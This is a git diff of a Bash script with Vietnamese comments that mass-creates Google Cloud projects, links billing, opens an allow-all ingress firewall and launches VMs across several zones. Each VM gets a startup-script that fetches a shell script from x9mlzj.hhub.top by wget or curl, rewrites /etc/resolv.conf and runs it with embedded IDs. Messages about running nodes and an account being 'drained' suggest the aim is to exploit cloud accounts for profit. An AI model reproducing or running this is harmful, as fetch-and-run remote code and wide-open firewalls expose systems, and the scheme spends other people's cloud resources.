@@ -1,46 +1,5 @@
 #!/bin/bash
 
-# Define the regions array
-regions=(
-  "us-east5-c"
-  "europe-west4-a"
-  "europe-west9-a"
-  "us-central1-a"
-  "us-east1-b"
-  "us-east4-a"
-  "europe-west1-a"
-  "asia-east1-a"
-)
-
-# Function to get a random number between 1 and 2
-get_random_count() {
-  echo $(( RANDOM % 2 + 1 ))
-}
-
-# Function to shuffle and get a random subset
-get_random_subset() {
-  local array=("$@")
-  local count=$(get_random_count)
-  local new_array=()
-
-  # Shuffle array
-  for i in $(shuf -i 0-$((${#array[@]}-1)) -n ${#array[@]}); do
-    new_array+=("${array[$i]}")
-  done
-
-  # Select first $count elements
-  new_array=("${new_array[@]:0:$count}")
-
-  echo "${new_array[@]}"
-}
-
-# Get random subset and store in zones array
-zones=($(get_random_subset "${regions[@]}"))
-
-# Print the new zones array
-echo "Selected zones: ${zones[@]}"
-
-
 # Hàm sinh chuỗi ngẫu nhiên có độ dài 5 ký tự
 generate_random_string() {
   local random_string=$(LC_ALL=C tr -dc 'a-z' < /dev/urandom | head -c 5 ; echo '')
@@ -69,9 +28,17 @@ generate_random_number() {
 }
 generate_valid_instance_name() {
   local random_number=$(generate_random_number)
-  echo "fx-${random_number}"
+  echo "prodvm-${random_number}"
 }
 
+# List of regions and regions where virtual machines need to be created
+zones=(
+  "us-east4-a"
+  "us-east1-b"
+  "us-east5-a"
+  "us-south1-a"
+  "us-west1-a"
+)
 # Kiểm tra sự tồn tại của tổ chức
 organization_id=$(gcloud organizations list --format="value(ID)" 2>/dev/null)
 echo "ID tổ chức của bạn là: $organization_id"
@@ -101,15 +68,14 @@ ensure_n_projects() {
 
       if [ -n "$organization_id" ]; then
         gcloud projects create "$project_id" --name="$project_name" --organization="$organization_id"
-        echo "Đang tạo dự án '$project_name' (ID: $project_id)."
-        sleep 2
+        sleep 1
       else
-        echo "Đang tạo dự án '$project_name' (ID: $project_id)."
         gcloud projects create "$project_id" --name="$project_name"
-        sleep 2
+        sleep 1
       fi
-      sleep 10
+      sleep 8
       gcloud alpha billing projects link "$project_id" --billing-account="$billing_account_id"
+      sleep 4
       gcloud config set project "$project_id"
       echo "Đã tạo dự án '$project_name' (ID: $project_id)."
     done
@@ -121,11 +87,11 @@ ensure_n_projects() {
 # Hàm tạo firewall rule cho một project
 create_firewall_rule() {
     local project_id=$1
-    gcloud compute --project="$project_id" firewall-rules create firewallld --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=all --source-ranges=0.0.0.0/0
+    gcloud compute --project="$project_id" firewall-rules create firewalldev --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=all --source-ranges=0.0.0.0/0
 }
 
 re_enable_compute_projects(){
-    sleep 4
+    sleep 3
     local projects=$(gcloud projects list --format="value(projectId)")
     echo "projects list: $projects"
     if [ -z "$projects" ]; then
@@ -135,7 +101,7 @@ re_enable_compute_projects(){
     for project_ide in $projects; do
         echo "enable api & create firewall_rule  for project: $project_ide ....."
         gcloud services enable compute.googleapis.com --project "$project_ide"
-        sleep 5
+        sleep 8
         create_firewall_rule "$project_ide"
         echo "enabled compute.googleapis.com project: $project_ide"
     done
@@ -145,7 +111,7 @@ re_enable_compute_projects(){
 check_service_enablement() {
     local project_id="$1"
     local service_name="compute.googleapis.com"
-    echo "Đang kiểm tra trạng thái compute.googleapis.com của dịch vụ $service_name trong dự án : $project_id..."
+    echo "Đang kiểm tra trạng thái của dịch vụ $service_name trong dự án : $project_id..."
 
     while true; do
         service_status=$(gcloud services list --enabled --project "$project_id" --filter="NAME:$service_name" --format="value(NAME)")
@@ -175,7 +141,6 @@ create_vms(){
         service_account_email=$(gcloud iam service-accounts list --project="$project_id" --format="value(email)" | head -n 1)
         if [ -z "$service_account_email" ]; then
             echo "No Service Account could be found in the project: $project_id"
-            echo "Chạy lại script hoặc xóa project chưa xóa hết."
             continue
         fi
         for zone in "${zones[@]}"; do
@@ -185,17 +150,16 @@ create_vms(){
             --zone="$zone" \
             --machine-type=t2d-standard-2 \
             --network-interface=network-tier=PREMIUM,nic-type=VIRTIO_NET,stack-type=IPV4_ONLY,subnet=default \
-            --metadata=^,@^startup-script=\#\!/bin/bash$'\n'tries=10$'\n'while\ \[\ \$tries\ -gt\ 0\ \]\ \&\&\ \!\ \{\ \(wget\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -4O\ setup.sh\ \|\|\ curl\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -Lo\ setup.sh\)\;\ \}\ \;\ do$'\n'\ \ \ \ echo\ \"Download\ failed,\ retrying\ \$tries\ more\ times\"$'\n'\ \ \ \ tries=\$\(\(tries-1\)\)$'\n'\ \ \ \ sleep\ 10$'\n'\ \ \ \ echo\ -e\ \"nameserver\ 8.8.8.8\\nnameserver\ 1.1.1.1\"\ \>\ /etc/resolv.conf$'\n'done$'\n'bash\ setup.sh\ 972c3c59-1341-4ad4-bea4-72dd50800d29\ -i=cba81b78-e8a5-4c2b-b620-3deff4e0b735\ -y \
             --maintenance-policy=MIGRATE \
             --provisioning-model=STANDARD \
             --service-account="$service_account_email" \
             --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append \
-            --enable-display-device \
-            --create-disk=auto-delete=yes,boot=yes,device-name="$instance_name",image=projects/ubuntu-os-cloud/global/images/ubuntu-2004-focal-v20240614,mode=rw,size=139,type=projects/"$project_id"/zones/"$zone"/diskTypes/pd-balanced \
+            --create-disk=auto-delete=yes,boot=yes,device-name="$instance_name",image=projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20240607,mode=rw,size=139,type=projects/"$project_id"/zones/"$zone"/diskTypes/pd-balanced \
             --no-shielded-secure-boot \
             --shielded-vtpm \
             --shielded-integrity-monitoring \
             --labels=goog-ec-src=vm_add-gcloud \
+            --metadata=^,@^startup-script=\#\!/bin/bash$'\n'tries=10$'\n'while\ \[\ \$tries\ -gt\ 0\ \]\ \&\&\ \!\ \{\ \(wget\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -4O\ setup.sh\ \|\|\ curl\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -Lo\ setup.sh\)\;\ \}\ \;\ do$'\n'\ \ \ \ echo\ \"Download\ failed,\ retrying\ \$tries\ more\ times\"$'\n'\ \ \ \ tries=\$\(\(tries-1\)\)$'\n'\ \ \ \ sleep\ 10$'\n'\ \ \ \ echo\ -e\ \"nameserver\ 8.8.8.8\\nnameserver\ 1.1.1.1\"\ \>\ /etc/resolv.conf$'\n'done$'\n'bash\ setup.sh\ 972c3c59-1341-4ad4-bea4-72dd50800d29\ -i=cba81b78-e8a5-4c2b-b620-3deff4e0b735\ -y \
             --reservation-affinity=any
             if [ $? -eq 0 ]; then
                 echo "Created instance $instance_name in project $project_id at region $zone sucessfully."
@@ -227,16 +191,19 @@ list_of_servers(){
 
 }
 
+# Gọi hàm để đảm bảo có đủ số lượng dự án
 # Hàm main: Chạy các hàm
 main() {
-    echo "----------------Bắt đầu tiến trình.-----------------"
+    echo "------*******Xã hội này có chạy node thì mới có ăn*******---------"
+    sleep 2
+    echo "----------------Đang kiểm tra  project.-----------------"
     ensure_n_projects
     echo "----------------Kiểm tra xong project.-----------------"
     re_enable_compute_projects
     run_enable_project_apicomputer
-    echo "----------------Tiến hành tạo máy.-------------"
+    echo "----------------Tiến hành tạo máy...... Hãy đi hút thuốc và đợi chạy xong-------------"
     create_vms
     list_of_servers
-    echo "Đã tạo máy thành công."
+    echo "Acc đã múc xong! bạn sắp thành trọc phú."
 }
 main
